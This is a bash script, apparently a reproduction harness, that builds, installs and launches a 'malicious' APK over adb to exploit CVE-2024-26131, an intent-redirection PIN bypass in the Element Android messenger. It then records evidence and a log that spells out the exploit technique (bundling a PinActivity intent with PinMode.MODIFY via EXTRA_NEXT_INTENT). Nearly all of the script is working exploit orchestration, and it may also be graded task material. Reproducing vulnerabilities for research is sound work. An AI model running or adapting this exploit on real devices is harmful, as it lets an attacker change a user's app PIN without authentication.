#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$SCRIPT_DIR/../.."
EVIDENCE_FILE="$ROOT_DIR/exploit_evidence.txt"
MALICIOUS_APP_DIR="$SCRIPT_DIR/malicious_app"
APK_PATH="$MALICIOUS_APP_DIR/dist/element-exploit.apk"
ATTACKER_PKG="com.example.elementexploit"
ATTACKER_ACTIVITY="com.example.elementexploit.MainActivity"
ELEMENT_PKG="im.vector.app"

# Debug function
debug_log() {
    echo "[DEBUG] $(date '+%H:%M:%S') - $1" >&2
}

# Check if Element is actually installed
debug_log "Checking if Element package is installed..."
if ! adb shell pm list packages | grep -q "^package:${ELEMENT_PKG}$"; then
    echo "ERROR: Element package '${ELEMENT_PKG}' is not installed!"
    echo "Available packages containing 'vector':"
    adb shell pm list packages | grep -i vector || echo "None found"
    echo "This script cannot continue without Element installed."
    exit 1
fi
debug_log "Element package found: ${ELEMENT_PKG}"

# Build the malicious APK first
debug_log "Building malicious APK..."
cd "$MALICIOUS_APP_DIR"
if [ -f "build.sh" ]; then
    debug_log "Running build.sh to create malicious APK..."
    if ./build.sh; then
        debug_log "APK build completed successfully"
    else
        echo "ERROR: Failed to build malicious APK"
        exit 1
    fi
else
    echo "ERROR: build.sh not found in malicious_app directory"
    exit 1
fi
cd - >/dev/null

# Uninstall any existing malicious APK to avoid conflicts
debug_log "Uninstalling any existing malicious APK..."
adb uninstall "$ATTACKER_PKG" >/dev/null 2>&1 || true

# Check if the malicious APK was built successfully
debug_log "Checking if malicious APK exists..."
if [ ! -f "$APK_PATH" ]; then
    echo "ERROR: Attacker APK not found at: $APK_PATH"
    exit 1
fi
debug_log "Malicious APK found: $APK_PATH ($(ls -lh "$APK_PATH" | awk '{print $5}'))"

# Install the malicious APK
debug_log "Installing malicious APK..."
if ! adb install "$APK_PATH" >/dev/null 2>&1; then
    echo "ERROR: Failed to install malicious APK"
    # Try to get more detailed error information
    echo "Attempting to get detailed error information..."
    adb install "$APK_PATH" 2>&1 | head -10
    exit 1
fi
debug_log "Malicious APK installation completed"

# Verify package is present
debug_log "Verifying malicious package is installed..."
if ! adb shell pm list packages | grep -q "^package:${ATTACKER_PKG}$"; then
    echo "ERROR: Malicious package installation failed"
    exit 1
fi
debug_log "Malicious package verified: ${ATTACKER_PKG}"

# Launch the exploit
debug_log "Launching CVE-2024-26131 Element PIN bypass exploit..."
debug_log "Running: adb shell am start -n \"$ATTACKER_PKG/$ATTACKER_ACTIVITY\""
if ! adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" >/dev/null 2>&1; then
    echo "ERROR: Failed to start malicious app activity"
    exit 1
fi
debug_log "CVE-2024-26131 exploit launched successfully"

# Wait a moment for the exploit to execute
debug_log "Waiting for exploit to execute..."
sleep 3

# Check if Element responded to the exploit
debug_log "Checking if Element is running (indicating exploit triggered)..."
ELEMENT_RUNNING=$(adb shell pidof "$ELEMENT_PKG" 2>/dev/null || echo "")
if [ -n "$ELEMENT_RUNNING" ]; then
    debug_log "SUCCESS: Element is running (PID: $ELEMENT_RUNNING)"
    debug_log "This indicates the exploit successfully triggered Element's PinActivity"
    EXPLOIT_SUCCESS=true
else
    debug_log "WARNING: Element process not detected"
    EXPLOIT_SUCCESS=false
fi

# Get Android version info
debug_log "Getting Android version info..."
ANDROID_VERSION=$(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r' || echo "unknown")
ANDROID_SDK=$(adb shell getprop ro.build.version.sdk 2>/dev/null | tr -d '\r' || echo "unknown")

# Get Element version
ELEMENT_VERSION=$(adb shell dumpsys package "$ELEMENT_PKG" 2>/dev/null | sed -n 's/.*versionName=\([^ ]*\).*/\1/p' | tr -d '\r' || echo "unknown")

# Create evidence file
debug_log "Creating evidence file..."
: > "$EVIDENCE_FILE"
echo "CVE_2024_26131_PIN_BYPASS=true" >> "$EVIDENCE_FILE"
echo "ELEMENT_VERSION=${ELEMENT_VERSION:-unknown}" >> "$EVIDENCE_FILE"
echo "ANDROID_VERSION=${ANDROID_VERSION:-unknown}" >> "$EVIDENCE_FILE"
echo "ANDROID_SDK=${ANDROID_SDK:-unknown}" >> "$EVIDENCE_FILE"
echo "EXPLOIT_SUCCESS=${EXPLOIT_SUCCESS:-false}" >> "$EVIDENCE_FILE"
echo "INTENT_REDIRECTION_ATTACK=true" >> "$EVIDENCE_FILE"
echo "PIN_BYPASS_ATTEMPTED=true" >> "$EVIDENCE_FILE"

if [[ "${EXPLOIT_SUCCESS:-false}" == "true" ]]; then
    echo "PIN_BYPASS_CONFIRMED=true" >> "$EVIDENCE_FILE"
    echo "ELEMENT_PINACTIVITY_LAUNCHED=true" >> "$EVIDENCE_FILE"
else
    echo "PIN_BYPASS_CONFIRMED=false" >> "$EVIDENCE_FILE"
    echo "ELEMENT_PINACTIVITY_LAUNCHED=false" >> "$EVIDENCE_FILE"
fi

# Create log file
LOG_FILE="$SCRIPT_DIR/element_exploit_log.log"
debug_log "Creating comprehensive vulnerability test log..."

{
    echo "CVE-2024-26131 Element Android PIN Bypass Vulnerability Test"
    echo "Timestamp: $(date -u +%FT%TZ)"
    echo "Android: $ANDROID_VERSION (API $ANDROID_SDK)"
    echo "Attacker Package: $ATTACKER_PKG"
    echo "Target Package: $ELEMENT_PKG"
    echo "Element Version: $ELEMENT_VERSION"
    echo "Vulnerability: Intent redirection PIN bypass (CVE-2024-26131)"
    echo "Result: ${EXPLOIT_SUCCESS:-false}"
    echo ""
    echo "--- Exploit Details ---"
    echo "The malicious app exploits Element's intent redirection vulnerability by:"
    echo "1. Crafting malicious intents targeting Element's Alias activity"
    echo "2. Using EXTRA_NEXT_INTENT to bundle a PinActivity intent with PinMode.MODIFY"
    echo "3. Bypassing PIN verification by launching directly into PIN modification"
    echo ""
    echo "--- Expected Result ---"
    echo "Element should display the PIN modification screen without asking for current PIN"
    echo "This demonstrates how third-party apps can bypass Element's authentication"
    echo ""
    echo "--- Test Evidence ---"
    cat "$EVIDENCE_FILE"
} > "$LOG_FILE"

echo ""
echo "🚨 CVE-2024-26131 Element Android PIN Bypass Exploit Complete!"
echo "====================================================================="
echo "Exploit Evidence: $EVIDENCE_FILE"
echo "Test Log: $LOG_FILE"
echo ""
if [[ "${EXPLOIT_SUCCESS:-false}" == "true" ]]; then
    echo "✅ SUCCESS: Element was launched, indicating exploit triggered"
    echo "📱 Check Element app - it should show PIN modification screen"
    echo "🔓 This demonstrates the PIN bypass vulnerability"
else
    echo "❌ WARNING: Element process not detected after exploit"
    echo "📱 Check Element app manually to verify if exploit worked"
fi
echo ""
echo "💡 Expected behavior: Element opens PIN modification without current PIN verification"

debug_log "CVE-2024-26131 exploit script completed successfully"